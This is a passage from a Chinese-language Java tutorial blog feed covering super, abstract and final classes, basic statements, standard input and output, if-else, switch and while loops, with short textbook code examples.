<h4 id="2-5-super的使用"><a href="#2-5-super的使用" class="headerlink" title="2.5  super的使用"></a><font color="#3CB371" face="Comic sans MS">2.5  super的使用</font></h4><p><font color="red" face="Comic sans MS">super：代表父类对象，在继承中有重要的作用</font><br><font face="Comic sans MS">📒<strong>使用情况：</strong><br>(1)  子类隐藏了超类中的变量或方法，而在程序中又要使用超类中被隐藏的变量或方法时<br><font color="red">&emsp;&emsp;格式：super.变量 ;  super.方法([参数表])</font><br>(2)  在子类的构造方法中引用超类的构造方法时<br><font color="red">&emsp;&emsp;格式： super([参数表])<br>📒<strong>注意:</strong>  构造方法不能被继承，但是子类的构造方法能确保它的直接父类<br>和间接父类的构造方法都被调用，但是注意一点：<strong>子类构造方法中调用父类构造方法时，调用语句必须放在子类构造方法中的第一句.</strong></font></font><br>&emsp;<br>&emsp;<br><font face="Comic sans MS"><br><strong>1.  📒使用super访问父类的属性和方法</strong><br><img data-src="https://i.loli.net/2018/12/26/5c232ab96c4be.png" alt="1.png"><br>&emsp;<br>&emsp;<br><strong>2.  📒使用super在子类中调用父类的构造方法</strong><br><img data-src="https://i.loli.net/2018/12/26/5c23311cb1dd4.png" alt="2.png"></p>
<p>&emsp;<br><strong>3.  📒使用super的注意事项</strong><br>(1)通过super不仅可以访问直接父类中定义的属性和方法，还可以访问间接父类中定义的属性和方法。<br>(2)由于它指的是父类对象，所以super不能在static环境中使用，包括类变量、类方法和static语句块。<br>(3)使用super不能访问本类定义的属性和方法。<br>(4)在构造方法中使用super时，super语句必须放在第一句<br>(5)在子类的构造方法中，super可以不明确使用，也可以明确使用。<br></font></p>
<p>&emsp;<br><font face="Comic sans MS"><strong>4.  📒明确使用super调用父类构造方法</strong></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">    Point（<span class="keyword">int</span> x）&#123;</span><br><span class="line">     <span class="keyword">this</span>.x=x;</span><br><span class="line">&#125;</span><br><span class="line">｝</span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MapPoint</span> <span class="keyword">extends</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">MapPoint()&#123;</span><br><span class="line">    <span class="keyword">super</span>(<span class="number">3</span>);  <span class="comment">//明确使用</span></span><br><span class="line">　System.out.println(<span class="string">&quot;MapPoint()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">　　<span class="keyword">new</span> MapPoint();</span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">｝</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;<br><font face="Comic sans MS"><strong>5.  📒不明确使用super调用父类构造方法</strong></font><br><font color="#FF6347">&emsp;<strong>当父类重载自己的构造函数时，在子类的构造函数中要明确写出到底是使用父类的哪一个构造函数！！！否则编译器不知道在子类中到底是调用父类的哪一个构造方法！</strong><br></font></p>
<p><font color="red"><strong>如下:</strong></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">    Point（<span class="keyword">int</span> x）&#123;</span><br><span class="line">     <span class="keyword">this</span>.x=x;</span><br><span class="line">&#125;</span><br><span class="line">｝</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MapPoint</span> <span class="keyword">extends</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">MapPoint()&#123;</span><br><span class="line">　System.out.println(<span class="string">&quot;MapPoint()&quot;</span>);</span><br><span class="line">　　&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">　　<span class="keyword">new</span> MapPoint();</span><br><span class="line">　　&#125;</span><br><span class="line">｝</span><br><span class="line"><span class="comment">//编译会出错</span></span><br></pre></td></tr></table></figure>

<p><font face="楷体">答案：因为子类中没有明确使用super，系统会自动在构造方法中加上super()，来调用直接父类的不带参数的构造方法，由于Point类中没有定义不带参数的构造方法，所以编译通不过。以上代码相当于：<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">    Point（<span class="keyword">int</span> x）&#123;</span><br><span class="line">     <span class="keyword">this</span>.x=x;</span><br><span class="line">&#125;</span><br><span class="line">｝</span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MapPoint</span> <span class="keyword">extends</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">MapPoint()&#123;</span><br><span class="line">　<span class="keyword">super</span>(); <span class="comment">//此处不能缺省</span></span><br><span class="line">　System.out.println(<span class="string">&quot;MapPoint()&quot;</span>);</span><br><span class="line">　　&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">　　<span class="keyword">new</span> MapPoint();</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;<br><strong>解决方法：</strong><br>(1)在MapPoint的构造方法中，明确使用super来调用父类已有的构造方法，如super(3);<br>(2)在Point中加入一个不带参数的构造方法，如Point{} 　　　　　<br>(3)去掉Point中全部的构造方法，则编译器会自动加入一个不带参数的构造方法，称为缺省构造方法。</p>
<p>&emsp;<br><strong>6.  📒构造方法的调用顺序</strong><br><font color="red"><strong>一个复杂对象的构造方法调用顺序如下：</strong></font></p>
<p>(1)首先调用父类的构造方法。这个步骤会反复递归，使继承阶层的根源最先被构建，然后是次一层的子类，直至最末一层子类为止；（即先调用最根部的父类，然后依次调用该父类的子类的子类的……..）<br>(2)根据各个成员的声明顺序，执行成员变量的初始化赋值；<br>(3)执行该构造方法中的各语句</p>
<p>&emsp;<br>&emsp;</p>
<h3 id="三、-抽象类与抽象方法abstract"><a href="#三、-抽象类与抽象方法abstract" class="headerlink" title="三、 抽象类与抽象方法abstract"></a><font color="#FF6347" face="Comic sans MS">三、 抽象类与抽象方法abstract</font></h3><p><font color="red" face="Comic sans MS"><strong>类似于它是一个模板！！！</strong></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">(1)abstract关键字修饰的类和方法
(2)抽象类不能创建任何对象，抽象类必须产生其子类，由子类创建对象。
(3)抽象类中可以包含抽象方法，也可以不包含抽象方法，但如果类中的某一方法是抽象的，整个类就必须被说
    明成抽象的。 
(4)抽象方法在子类中必须被实现，否则子类仍是抽象的。
(5)抽象类不是可有可无的。
(6)(类、成员方法、成员属性)访问权限修饰符为abstract。</font></td></tr></table>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">4</span>-<span class="number">17</span>]  抽象类举例</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Shape</span> </span></span><br><span class="line"><span class="class"></span>&#123;  <span class="function"><span class="keyword">abstract</span>  <span class="keyword">double</span>  <span class="title">area</span><span class="params">()</span></span>; </span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>; &#125;                                         </span><br><span class="line"> <span class="comment">//上述方法对一般图形无法定义其实现</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>  <span class="keyword">extends</span> <span class="title">Shape</span>  </span>&#123;</span><br><span class="line"><span class="keyword">int</span> width;                        </span><br><span class="line">       <span class="keyword">int</span> length;                       </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">area</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//矩型类实现了Shape类的抽象方法area()</span></span><br><span class="line">   <span class="keyword">return</span> width*length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span> <span class="params">()</span> </span>&#123;  … …     </span><br><span class="line"><span class="comment">//矩型类实现了Shape类的抽象方法draw()，详细可由自己完成&#125; </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h3 id="四、-final类和final方法"><a href="#四、-final类和final方法" class="headerlink" title="四、 final类和final方法 "></a><font color="#FF6347" face="Comic sans MS">四、 final类和final方法 </font></h3><h4 id="4-1-final类"><a href="#4-1-final类" class="headerlink" title="4.1  final类"></a><font color="#3CB371" face="Comic sans MS">4.1  final类</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">如果一个类被final修饰符所修饰和限定，说明这个类不能被继承，即不可能有子类——最终类
             例如：*java.lang.System*
**📒作用：**
final修饰符通常是出于安全的目的而使用的，因为不能继承final类，人们就不能重载或覆盖它的任何方法。
如果允许一个类被继承，其允许被重载或覆盖的方法可能会被改写。保证某个特定的方法在类层次关系上
的某层以后只有一个定义，这对于那些安全性非常关键的类是非常必要的。</font></td></tr></table>

<p>&emsp;<br>&emsp;</p>
<h4 id="4-2-final方法"><a href="#4-2-final方法" class="headerlink" title="4.2  final方法"></a><font color="#3CB371" face="Comic sans MS">4.2  final方法</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">final修饰符所修饰的方法，是不能被子类所覆盖的方法。
📒**作用：**固定了这个方法所对应的具体操作，可以防止子类对父类关键
            方法的错误的重定义，保证了程序的安全性和正确性。
📒**注意：**所有已被private修饰符限定为私有的方法，以及所有包含在final类中的方法，都被默认为是
            final的。
            因为这些方法不可能被子类所继承，所以不可能被重载，自然都是最终的方法。
</font></td></tr></table>

<p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java简单语句、复合语句、控制语句(3.7-3.8)</title>
    <url>/post/Java-Language-2-3/</url>
    <content><![CDATA[<p>&ensp;<br>&ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>简单语句和复合语句 & 控制语句</font></center>

<p>&emsp;<br>&emsp;</p>
<h3 id="一、-简单语句和复合语句"><a href="#一、-简单语句和复合语句" class="headerlink" title="一、 简单语句和复合语句 "></a><font color="#FF6347" face="Comic sans MS">一、 简单语句和复合语句 </font></h3><h4 id="1-1-变量定义语句"><a href="#1-1-变量定义语句" class="headerlink" title="1.1  变量定义语句"></a><font color="#3CB371" face="Comic sans MS">1.1  变量定义语句</font></h4><p><font face="Comic sans MS"> 变量定义语句用来定义一个变量，基本格式为：<br>&emsp;&emsp;<font color="red">            类型 变量名1, 变量名2…；</font><br>       例：char c=‘a’;  int i,j=1;<br></font></p>
<h4 id="1-2-赋值语句"><a href="#1-2-赋值语句" class="headerlink" title="1.2  赋值语句"></a><font color="#3CB371" face="Comic sans MS">1.2  赋值语句</font></h4><p><font face="Comic sans MS">  赋值语句是将表达式的值赋给变量，其格式为：<br>&emsp;&emsp;<font color="red">变量=表达式；</font><br>      例： char c;  c=‘a’;<br></font></p>
<h4 id="1-3-方法调用语句"><a href="#1-3-方法调用语句" class="headerlink" title="1.3  方法调用语句 "></a><font color="#3CB371" face="Comic sans MS">1.3  方法调用语句 </font></h4><p><font face="Comic sans MS"> 方法调用语句的一般形式为：<br>&emsp;&emsp;<font color="red">对象.方法名( 实参数列表 );</font><br>      例如  System.out.println(“Example!”);<br></font></p>
<h4 id="1-4-空语句"><a href="#1-4-空语句" class="headerlink" title="1.4  空语句 "></a><font color="#3CB371" face="Comic sans MS">1.4  空语句 </font></h4><p><font face="Comic sans MS"> 方法调用语句的一般形式为：<br>&emsp;&emsp;<font color="red">；//这是一条空语句</font><br></font></p>
<h4 id="1-5-标准输入输出（I-O）"><a href="#1-5-标准输入输出（I-O）" class="headerlink" title="1.5  标准输入输出（I/O） "></a><font color="#3CB371" face="Comic sans MS">1.5  标准输入输出（I/O） </font></h4><p><font face="Comic sans MS">输入和输出是Java程序的重要组成部分,它提供了人机交互的手段，它们属于方法调用语句。<a href="https://directoree.top/post/Java-IO-1">具体使用方法参考本博客IO使用方法</a>。</p>
<p><font color="#00B2EE"><strong>1. 输入输出</strong></font><br>       输入是指把需要加工的数据放到程序中,read<br>       输出则把程序处理的结果呈现给用户,write<br><font color="#00B2EE"><strong>2. 标准输入输出</strong></font><br>       一般用键盘作为标准的输入设备<br>       显示器则是标准的输出设备<br><strong>通过System.in和System.out对象分别与键盘和显示器发生联系进行输入和输出。</strong><br></font></p>
<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>📒1. 标准输出System.out对象</strong></font><br><font color="#00B2EE">System.out</font>对象中包含的最常用的方法是：<br><font color="#00B2EE">   print<strong>ln</strong>(参数)</font> 向标准输出设备(显示器)打印一行文本并换行<br><font color="#00B2EE">  print(参数)</font> 向标准输出设备(显示器)打印一行文本但不换行<br>   参数类型：boolean , char char[] ,double ,float ,int ,<br>                  long ,  Object,String </p>
<p>  例如：System.out.println(“Example”);<br>           System.out.print(“Input Name”);<br>           int x=2; System.out.print(x);<br></font></p>
<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>📒2. 标准输入System.in对象</strong></font><br><font color="#00B2EE"><strong>System.in</strong></font>是字节流,作用是从标准输入读一个字节,常用的方法如下:<br><font color="red">   int read()</font>&emsp;           从流中读取一个字节并将该字节作为整数返回,若没有数据则返回-1<br><font color="red">    int read(byte b[])</font>&emsp; 从流中读取多个字节放到b中, 返回实际读取到的字节数<br><font color="red">   int read(byte b[],int off,int len)</font>&emsp; 从流中读取最多len字节的数据, 放到数组b的下标off开始的单元中，返回读取到的字节数<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-1] ReadChar.java 从键盘读一个字符</span><br><span class="line">import java.io.*;</span><br><span class="line">public class ReadChar&#123;</span><br><span class="line">   public static void main(String args[])&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">         char ch=(char)System.in.read(); //将int转换为char</span><br><span class="line">         System.out.println(ch);    </span><br><span class="line">         &#125;catch(IOException e)&#123;&#125;</span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[例3-2] ReadString.java 从键盘读一串字符</span><br><span class="line">import java.io.*;    </span><br><span class="line">public class ReadString</span><br><span class="line">&#123; public static void main(String args[])</span><br><span class="line">     &#123;  char c;</span><br><span class="line">         try&#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">           &#123;  c=(char)System.in.read();  //使用循环来从输入流中读取一转字符</span><br><span class="line">              System.out.print(c);</span><br><span class="line">            &#125;<span class="keyword">while</span>(c!=<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">         &#125;catch(IOException e)&#123;  &#125;                    </span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[例3-3] ReadStringOrInt.java 从键盘读一数字串或一个整数</span><br><span class="line">import java.io.*;</span><br><span class="line">class ReadStringOrInt&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">	      byte buf[]=new byte[20];  </span><br><span class="line">	      String str;</span><br><span class="line">           int anInt;         </span><br><span class="line">	      try&#123;    </span><br><span class="line">               System.in.read(buf);  </span><br><span class="line">	          str=new String(buf)</span><br><span class="line">	          anInt=Integer.parseInt(str.trim()); </span><br><span class="line">	           &#125;</span><br><span class="line">	      catch(Exception e)&#123;  &#125; 	</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">//要将数字串转换成实数，则： </span><br><span class="line">  <span class="built_in">float</span>  f=Float.parseFloat(str.trim());        //转成单精度数</span><br><span class="line">  double d=Double.parseDouble(str.trim());      //转成双精度数  </span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>思考：如何接收用户向程序输入的参数?<br>通过System.in<br>通过main（String[] args）中的形参<br>class test{<br>public static void main(String[] args){<br>   System.out.println(args[0]);<br>   System.out.println(args[1]);<br>}<br>}<br>java test s1 s2<br>s1<br>s2</p>
</blockquote>
</blockquote>
<hr>
<hr>
<p>&emsp;</p>
<h3 id="二、-控制语句句"><a href="#二、-控制语句句" class="headerlink" title="二、 控制语句句 "></a><font color="#FF6347" face="Comic sans MS">二、 控制语句句 </font></h3><ul>
<li>[ ]2.1选择语句<ul>
<li>2.1.1 if-else语句  </li>
<li>2.1.2 switch语句</li>
</ul>
</li>
<li>[ ]2.2循环语句 <ul>
<li>2.2.1 while 语句 </li>
<li>2.2.2 do-while 语句</li>
<li>2.2.3 for 语句</li>
<li>2.2.4 循环的嵌套</li>
</ul>
</li>
<li>[ ]2.3跳转语句  <ul>
<li>2.3.1 break语句</li>
<li>2.3.2 continue语句</li>
<li>2.3.3 return 语句 </li>
</ul>
</li>
</ul>
<h4 id="2-1-选择语句"><a href="#2-1-选择语句" class="headerlink" title="2.1  选择语句"></a><font color="#3CB371" face="Comic sans MS">2.1  选择语句</font></h4><h5 id="if-else语句"><a href="#if-else语句" class="headerlink" title="  if-else语句"></a><font color="#00B2EE" face="Comic sans MS">  if-else语句</font></h5><p><font face="Comic sans MS"><font color="red"><strong>📒if-else语句的语法形式：</strong></font><br>       if  (布尔表达式)<br>         {    语句块1   }<br>       [ else<br>          {   语句块2      }  ]<br>     若语句块1，语句块2也是if-else语句便形成嵌套<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">例［<span class="number">3</span>-<span class="number">4</span>］：三个整数a,b,c，要求按从小到大的次序输出</span><br><span class="line">解题思路：对a,b,c进行排序。先找出a、b、c中最小的，然后比较剩下的两个。</span><br><span class="line">算法：    </span><br><span class="line">        ①如果a&gt;b，则将a和b互换（使得a是a、b中小的那个）</span><br><span class="line">        ②如果a&gt;c，则将a和c互换（使得a是a、b、c中最小的）</span><br><span class="line">        ③如果b&gt;c，则将b和c互换（最后c最大，b次之，a最小）</span><br><span class="line">代码如下：</span><br><span class="line">     <span class="keyword">if</span>(a&gt;b)</span><br><span class="line">	&#123;</span><br><span class="line">          t=a;a=b;b=t;</span><br><span class="line">     &#125;</span><br><span class="line">	<span class="keyword">if</span>(a&gt;c)</span><br><span class="line">	&#123;</span><br><span class="line">          t=a;a=c;c=t;</span><br><span class="line">     &#125;</span><br><span class="line">	<span class="keyword">if</span>(b&gt;c)</span><br><span class="line">	&#123;</span><br><span class="line">          t=b;b=c;c=t;</span><br><span class="line">     &#125;</span><br><span class="line">    System.out.println(a+<span class="string">&quot;&lt; &quot;</span> +b+<span class="string">&quot;&lt; &quot;</span> +c);   </span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒  if–else 语句的嵌套**</font>    
if-else语句中内嵌的语句1或语句2又是if-else语句的情况称为if-else语句的嵌套。如：
      if（布尔表达式1）
           语句1
      else if（布尔表达式2）
                 语句2
                 …
             else if (布尔表达式m)
                        语句m
                    else  语句n
</font></td></tr></table>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">3</span>-<span class="number">5</span>] 求一元二次方程(aX2+bX+c=<span class="number">0</span>)的根：</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">roots</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">		<span class="keyword">int</span> a,b,c;</span><br><span class="line">		<span class="keyword">float</span> x1,x2;</span><br><span class="line">		<span class="keyword">int</span> check;</span><br><span class="line">		a=<span class="number">1</span>;b=-<span class="number">2</span>;c=<span class="number">1</span>;</span><br><span class="line">		check=b*b-<span class="number">4</span>*a*c;</span><br><span class="line">		<span class="keyword">if</span>(check==<span class="number">0</span>)&#123;</span><br><span class="line">			x1=(-b)/(<span class="number">2</span>*a);</span><br><span class="line">			x2=x1;</span><br><span class="line">			System.out.println(<span class="string">&quot;x1=&quot;</span>+x1);</span><br><span class="line">			System.out.println(<span class="string">&quot;x2=&quot;</span>+x2);</span><br><span class="line">		&#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> (check&gt;<span class="number">0</span>) &#123;</span><br><span class="line">          x1=(-b+(<span class="keyword">float</span>)Math.sqrt(check))/(<span class="number">2</span>*a);</span><br><span class="line">          x2=(-b-(<span class="keyword">float</span>)Math.sqrt(check))/(<span class="number">2</span>*a);</span><br><span class="line">          System.out.println(<span class="string">&quot;x1=&quot;</span>+x1);</span><br><span class="line">          System.out.println(<span class="string">&quot;x2=&quot;</span>+x2);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;   <span class="comment">/*请自己填写*/</span>   &#125;</span><br><span class="line">     &#125; &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">课堂练习：求最小数</span><br><span class="line"><span class="keyword">import</span>  java.io.*;             </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Min</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"> </span>&#123; </span><br><span class="line">   <span class="keyword">byte</span> buf[]=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">20</span>];  </span><br><span class="line">   String str ;  <span class="keyword">int</span> a, b, min;    </span><br><span class="line">   System.out.println(<span class="string">&quot;请输入二个整数：&quot;</span>);                    </span><br><span class="line">   System.in.read(buf);        <span class="comment">//从键盘读一数字串存于buf中</span></span><br><span class="line">   str=<span class="keyword">new</span> String(buf);              <span class="comment">//buf 转换成字符串 </span></span><br><span class="line">   a=Integer.parseInt(str.trim());  <span class="comment">//数字串转换成整数</span></span><br><span class="line">   System.in.read(buf);    str=<span class="keyword">new</span> String(buf);                   </span><br><span class="line">   b=Integer.parseInt(str.trim());        </span><br><span class="line">    </span><br><span class="line">   min=a;</span><br><span class="line">   <span class="keyword">if</span> (min&gt;b) min=b;</span><br><span class="line">   System.out.println(<span class="string">&quot;最小数是&quot;</span>+min);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;</p>
<h5 id="switch-语句"><a href="#switch-语句" class="headerlink" title="  switch  语句"></a><font color="#00B2EE" face="Comic sans MS">  switch  语句</font></h5><p><font face="Comic sans MS"><strong>switch语句根据表达式的结果来执行多个可能操作中的一个，它的语法形式如下：</strong><br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">case</span> 常量<span class="number">1</span>：语句<span class="number">1</span>  </span><br><span class="line">                [<span class="keyword">break</span>;]</span><br><span class="line"> <span class="keyword">case</span> 常量<span class="number">2</span>：语句<span class="number">2</span></span><br><span class="line">                [<span class="keyword">break</span>;]</span><br><span class="line"> …</span><br><span class="line"> <span class="keyword">case</span> 常量n：语句n</span><br><span class="line">                 [<span class="keyword">break</span>;]</span><br><span class="line"> [<span class="keyword">default</span>: 缺省处理语句</span><br><span class="line">                 <span class="keyword">break</span>；]    <span class="comment">//这儿的break语句不必要</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>注意：</strong></font> <font color="red">“case 常量”</font>只起语句标号的作用，并非在该处进行条件判断。在执行switch语句时，根据switch括号中表达式的值找到匹配的入口标号，就从此标号所标记的语句开始执行下去，<font color="red">不再进行判断，直到遇到break语句为止。</font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">演示有<span class="built_in">break</span>及没有<span class="built_in">break</span>的情况</span><br><span class="line">public class switchBreak</span><br><span class="line">&#123;</span><br><span class="line">      public static void main(String args[])</span><br><span class="line">     &#123;   …</span><br><span class="line">         switch(2)</span><br><span class="line">         &#123; </span><br><span class="line">          <span class="keyword">case</span> 1: System.out.println(<span class="string">&quot;case1&quot;</span>);</span><br><span class="line">                      <span class="built_in">break</span>;</span><br><span class="line">          <span class="keyword">case</span> 2: System.out.println(<span class="string">&quot;case2&quot;</span>);</span><br><span class="line">                      <span class="built_in">break</span>;</span><br><span class="line">          <span class="keyword">case</span> 3: System.out.println(<span class="string">&quot;case3&quot;</span>);</span><br><span class="line">                      <span class="built_in">break</span>;</span><br><span class="line">          default: System.out.println(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>使用switch-case必须注意:</strong></font><br><font color="#00B2EE"><strong>1.</strong></font> 表达式必须是符合byte,char,short和int类型的表达式,不能是浮点类型或字符串，case子句中常量的类型必须与表达式的类型相容,且每个常量必须不同；<br><font color="#00B2EE"><strong>2.</strong></font> case后面可以有多条语句，不用加{}；<br><font color="#00B2EE"><strong>3.</strong></font> default子句是可选的。如果有default，当表达式的值与case子句的值都不匹配时就会执行default分支，如果既没匹配也没default，那就什么也不执行；<br><font color="#00B2EE"><strong>4.</strong></font> break为跳转语句，表示跳出switch结构，即终止switch语句的执行。如果没有break语句，则switch在执行完一个case分支后，流程控制转移到下一个case继续执行，不再匹配，直到遇到break为止。<br><font color="#00B2EE"><strong>5.</strong></font> 多个case子句可以共享相同的语句块；<br><font color="#00B2EE"><strong>6.</strong></font> 通过if-else语句可以实现switch语句所有的功能。但通常使用switch语句更简练，且可读性强，程序的执行效率也高；<br><font color="#00B2EE"><strong>7.</strong></font> if-else语句可以基于一个范围内的值或一个条件来进行不同的操作，但switch语句中的每个case子句都必须对应一个单值。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-6] 用switch语句判断一个月份属于一年哪个季节(春、夏、秋、冬)。</span><br><span class="line">class SwitchDemo&#123;</span><br><span class="line"> public static void main(String args[]) &#123; </span><br><span class="line">  int month=7;</span><br><span class="line">  String season;</span><br><span class="line">  switch (month)     //值为12、1和2时将都执行：season=<span class="string">&quot;冬季&quot;</span>; <span class="built_in">break</span>;</span><br><span class="line">  &#123; <span class="keyword">case</span>  12: </span><br><span class="line">    <span class="keyword">case</span>  1:</span><br><span class="line">    <span class="keyword">case</span>  2:</span><br><span class="line">      season=<span class="string">&quot;冬季&quot;</span>;  </span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">    <span class="keyword">case</span>  3:</span><br><span class="line">    <span class="keyword">case</span>  4:</span><br><span class="line">    <span class="keyword">case</span>  5:</span><br><span class="line">      season=<span class="string">&quot;春季&quot;</span>；</span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">   <span class="keyword">case</span>  6:</span><br><span class="line">   <span class="keyword">case</span>  7:</span><br><span class="line">   <span class="keyword">case</span>  8:  season=<span class="string">&quot;夏季&quot;</span>; </span><br><span class="line">                 <span class="built_in">break</span>;</span><br><span class="line">   <span class="keyword">case</span>  9:</span><br><span class="line">   <span class="keyword">case</span>  10:</span><br><span class="line">   <span class="keyword">case</span>  11: season=<span class="string">&quot;秋季&quot;</span>；</span><br><span class="line">                 <span class="built_in">break</span>;</span><br><span class="line">   default:  season=<span class="string">&quot;错!&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   System.out.println(<span class="string">&quot;月份    季节&quot;</span>);</span><br><span class="line">   System.out.println(month+<span class="string">&quot;    &quot;</span>+season);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">该程序运行后输出：月份    季节</span><br><span class="line">                 7      夏季</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="2-2-循环语句"><a href="#2-2-循环语句" class="headerlink" title="2.2  循环语句"></a><font color="#3CB371" face="Comic sans MS">2.2  循环语句</font></h4><h5 id="while-语句"><a href="#while-语句" class="headerlink" title="while  语句  "></a><font color="#00B2EE" face="Comic sans MS">while  语句  </font></h5><p><font face="Comic sans MS">while语句形式如下：<br>&emsp;&emsp;<font color="red">     while (布尔表达式) {语句块}  </font><br><strong>说明：</strong>while：语句的关键字； 布尔表达式：循环条件； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-7] Sum1.java用<span class="keyword">while</span>循环语句计算s=1+1/2+1/3+…+1/100</span><br><span class="line">class Sum &#123;</span><br><span class="line">  public static void main(String args[]) &#123;</span><br><span class="line">    int n=100;　                //循环总数n=100</span><br><span class="line">    int  i=1;　　     　　      //循环次数，初值为１</span><br><span class="line">    <span class="built_in">float</span> s=0;                 //和s为实型</span><br><span class="line">    <span class="keyword">while</span> (i&lt;=100) 　　　      //循环条件,循环总数100</span><br><span class="line">    &#123;</span><br><span class="line">     s=s+(1.0f/i);            //s增加1/i ,1.0f表示是<span class="built_in">float</span>型</span><br><span class="line">     i++;                    //循环次数加１</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(“s=”+s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;                              